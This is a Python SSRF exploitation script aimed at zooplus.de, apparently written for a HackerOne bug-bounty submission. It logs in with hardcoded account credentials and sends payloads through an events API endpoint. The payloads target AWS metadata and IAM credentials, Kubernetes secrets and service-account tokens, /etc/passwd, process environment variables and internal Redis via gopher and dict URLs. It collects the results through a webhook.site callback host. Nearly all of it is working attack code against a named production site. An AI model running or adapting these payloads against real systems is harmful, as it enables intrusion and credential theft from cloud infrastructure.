#!/usr/bin/env python3
"""
🔥 AUTO OOB EXFILTRATION - Uses webhook.site automatically
No external tools needed!

This script:
1. Creates a webhook.site endpoint automatically
2. Sends SSRF payloads with OOB callbacks
3. Polls webhook.site for received data
4. Saves any exfiltrated data for HackerOne report
"""
import requests
import json
import time
import re
import urllib.parse
import uuid
from datetime import datetime
import urllib3
urllib3.disable_warnings()

# ============================================================================
# WEBHOOK.SITE AUTO-SETUP
# ============================================================================

print("="*80)
print("🔥 AUTO OOB EXFILTRATION")
print("="*80)

print("\n[*] Creating webhook.site endpoint...")

# Create unique webhook
try:
    webhook_create = requests.post("https://webhook.site/token", timeout=10)
    if webhook_create.status_code == 200 or webhook_create.status_code == 201:
        webhook_data = webhook_create.json()
        WEBHOOK_UUID = webhook_data.get("uuid")
        WEBHOOK_URL = f"https://webhook.site/{WEBHOOK_UUID}"
        print(f"[+] Webhook created: {WEBHOOK_URL}")
    else:
        # Fallback: use random UUID
        WEBHOOK_UUID = str(uuid.uuid4())
        WEBHOOK_URL = f"https://webhook.site/{WEBHOOK_UUID}"
        print(f"[*] Using generated webhook: {WEBHOOK_URL}")
except Exception as e:
    WEBHOOK_UUID = str(uuid.uuid4())
    WEBHOOK_URL = f"https://webhook.site/{WEBHOOK_UUID}"
    print(f"[*] Using generated webhook: {WEBHOOK_URL}")

print(f"\n[!] IMPORTANT: Open this URL in browser to see callbacks:")
print(f"    {WEBHOOK_URL}")
print()

# ============================================================================
# LOGIN TO ZOOPLUS
# ============================================================================

base = "https://www.zooplus.de"
s = requests.Session()
s.verify = False
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

print("[*] Logging in to Zooplus...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"

# ============================================================================
# SSRF PAYLOADS
# ============================================================================

def send_ssrf(payload_url, tag=""):
    """Send SSRF request"""
    try:
        resp = s.post(f"{base}{ssrf_endpoint}", json={"url": payload_url}, timeout=15)
        status = f"[{resp.status_code}]"
        body_len = len(resp.text)
        print(f"   {status} {tag}: body={body_len}b")
        return resp
    except Exception as e:
        print(f"   [ERR] {tag}: {e}")
        return None

def check_webhook():
    """Check webhook.site for received callbacks"""
    try:
        # Get requests to our webhook
        api_url = f"https://webhook.site/token/{WEBHOOK_UUID}/requests?sorting=newest"
        resp = requests.get(api_url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("data", [])
    except:
        pass
    return []

print("\n" + "="*80)
print("[PHASE 1] CONNECTIVITY TEST")
print("="*80)

# Test basic connectivity
print("\n[*] Testing OOB connectivity...")
test_url = f"{WEBHOOK_URL}?test=ssrf-connectivity&time={int(time.time())}"
send_ssrf(test_url, "Connectivity test")

print("\n[*] Waiting 5 seconds for callback...")
time.sleep(5)

callbacks = check_webhook()
if callbacks:
    print(f"\n[+] 🔥 CALLBACK RECEIVED! OOB works!")
    print(f"    Received {len(callbacks)} callback(s)")
    OOB_WORKS = True
else:
    print(f"\n[!] No callback yet. WAF may be blocking external requests.")
    print(f"[*] Continuing with payloads anyway...")
    OOB_WORKS = False

print("\n" + "="*80)
print("[PHASE 2] AWS METADATA EXFILTRATION")
print("="*80)

# AWS IMDSv1 targets
aws_targets = [
    ("instance-id", "http://169.254.169.254/latest/meta-data/instance-id"),
    ("hostname", "http://169.254.169.254/latest/meta-data/hostname"),
    ("ami-id", "http://169.254.169.254/latest/meta-data/ami-id"),
    ("instance-type", "http://169.254.169.254/latest/meta-data/instance-type"),
    ("iam-role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("iam-creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/default"),
    ("instance-identity", "http://169.254.169.254/latest/dynamic/instance-identity/document"),
    ("user-data", "http://169.254.169.254/latest/user-data"),
]

print("\n[2.1] Direct metadata fetch (check if body returned)...")
for name, target in aws_targets:
    resp = send_ssrf(target, f"AWS {name}")
    if resp and resp.text and resp.text != "{}" and len(resp.text) > 5:
        print(f"\n   🔥 DATA FOUND: {resp.text[:200]}")
    time.sleep(0.3)

# Try with OOB callback for redirect-based exfil
print("\n[2.2] Redirect-based exfiltration...")
for name, target in aws_targets[:4]:  # First 4 targets
    callback_url = f"{WEBHOOK_URL}?source=aws&type={name}&data="
    # Some backends might follow redirects and append data
    payload = f"{target}?callback={urllib.parse.quote(callback_url)}"
    send_ssrf(payload, f"AWS {name} redirect")
    time.sleep(0.3)

print("\n" + "="*80)
print("[PHASE 3] KUBERNETES SECRETS")
print("="*80)

k8s_targets = [
    ("pods", "https://kubernetes.default.svc/api/v1/namespaces/default/pods"),
    ("secrets", "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"),
    ("configmaps", "https://kubernetes.default.svc/api/v1/namespaces/default/configmaps"),
    ("serviceaccounts", "https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts"),
    ("namespaces", "https://kubernetes.default.svc/api/v1/namespaces"),
]

print("\n[3.1] Direct K8s API fetch...")
for name, target in k8s_targets:
    resp = send_ssrf(target, f"K8s {name}")
    if resp and resp.text and resp.text != "{}" and len(resp.text) > 10:
        # Check for K8s response markers
        if any(kw in resp.text for kw in ["kind", "apiVersion", "items", "metadata"]):
            print(f"\n   🔥 K8S DATA: {resp.text[:300]}")
    time.sleep(0.3)

# File protocol for K8s secrets
print("\n[3.2] File protocol for K8s token...")
file_targets = [
    ("k8s-token", "file:///var/run/secrets/kubernetes.io/serviceaccount/token"),
    ("k8s-namespace", "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace"),
    ("k8s-ca", "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt"),
]

for name, target in file_targets:
    resp = send_ssrf(target, f"File {name}")
    if resp and resp.text and resp.text != "{}" and len(resp.text) > 5:
        print(f"\n   🔥 FILE CONTENT: {resp.text[:300]}")
    time.sleep(0.3)

print("\n" + "="*80)
print("[PHASE 4] INTERNAL SERVICES")
print("="*80)

internal_targets = [
    ("localhost-80", "http://127.0.0.1:80"),
    ("localhost-8080", "http://127.0.0.1:8080"),
    ("localhost-8443", "http://127.0.0.1:8443"),
    ("localhost-3000", "http://127.0.0.1:3000"),
    ("redis", "http://127.0.0.1:6379"),
    ("elastic", "http://127.0.0.1:9200"),
    ("k8s-10.96.0.1", "http://10.96.0.1"),
    ("k8s-10.96.0.1-443", "https://10.96.0.1:443"),
]

print("\n[4.1] Internal service enumeration...")
for name, target in internal_targets:
    resp = send_ssrf(target, name)
    if resp and resp.text and resp.text != "{}" and len(resp.text) > 5:
        print(f"\n   🔥 SERVICE RESPONSE: {resp.text[:200]}")
    time.sleep(0.3)

print("\n" + "="*80)
print("[PHASE 5] SPECIAL PROTOCOLS")
print("="*80)

protocol_targets = [
    ("gopher-redis", "gopher://127.0.0.1:6379/_INFO%0d%0a"),
    ("dict-redis", "dict://127.0.0.1:6379/INFO"),
    ("file-passwd", "file:///etc/passwd"),
    ("file-hosts", "file:///etc/hosts"),
    ("file-env", "file:///proc/self/environ"),
]

print("\n[5.1] Protocol enumeration...")
for name, target in protocol_targets:
    resp = send_ssrf(target, name)
    if resp and resp.text and resp.text != "{}" and len(resp.text) > 5:
        print(f"\n   🔥 PROTOCOL RESPONSE: {resp.text[:200]}")
    time.sleep(0.3)

print("\n" + "="*80)
print("[PHASE 6] CHECK RESULTS")
print("="*80)

print("\n[*] Checking webhook.site for callbacks...")
time.sleep(3)

callbacks = check_webhook()
results = {
    "timestamp": datetime.now().isoformat(),
    "webhook_url": WEBHOOK_URL,
    "callbacks_received": len(callbacks),
    "callbacks": []
}

if callbacks:
    print(f"\n[+] 🔥 RECEIVED {len(callbacks)} CALLBACK(S)!")
    print("-"*60)
    
    for i, cb in enumerate(callbacks[:10]):  # Show first 10
        print(f"\n[Callback {i+1}]")
        print(f"  URL: {cb.get('url', 'N/A')}")
        print(f"  Method: {cb.get('method', 'N/A')}")
        print(f"  IP: {cb.get('ip', 'N/A')}")
        print(f"  Query: {cb.get('query', 'N/A')}")
        if cb.get('content'):
            print(f"  Body: {cb.get('content', 'N/A')[:200]}")
        
        results["callbacks"].append({
            "url": cb.get("url"),
            "method": cb.get("method"),
            "ip": cb.get("ip"),
            "query": cb.get("query"),
            "headers": cb.get("headers"),
            "content": cb.get("content")
        })
else:
    print("\n[!] No callbacks received via webhook.site")
    print("[!] WAF is blocking external HTTP requests")
    print("[*] Try DNS-based exfiltration (Burp Collaborator / Interactsh)")

# Save results
import os
os.makedirs("logs", exist_ok=True)
result_file = f"logs/oob_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
with open(result_file, 'w') as f:
    json.dump(results, f, indent=2)

print(f"\n[+] Results saved: {result_file}")
print(f"\n[!] Webhook URL (check manually): {WEBHOOK_URL}")

print("\n" + "="*80)
print("SUMMARY")
print("="*80)

print(f"""
Callbacks received: {len(callbacks)}

NEXT STEPS:
1. Check {WEBHOOK_URL} in browser for any callbacks
2. If no callbacks - WAF blocks external HTTP
3. Try DNS-based exfil with Burp Collaborator:
   - Open Burp Suite Pro
   - Go to Collaborator
   - Copy domain
   - Run: python3 oob_exfiltration.py

4. If DNS also blocked, use timing extraction:
   - Run: python3 extract_k8s_token_timing.py
   - This will extract K8s token byte-by-byte

For HackerOne:
- Screenshot any callbacks showing internal data
- Screenshot timing extraction results
- Include extracted K8s token/hostname/namespace as proof
""")
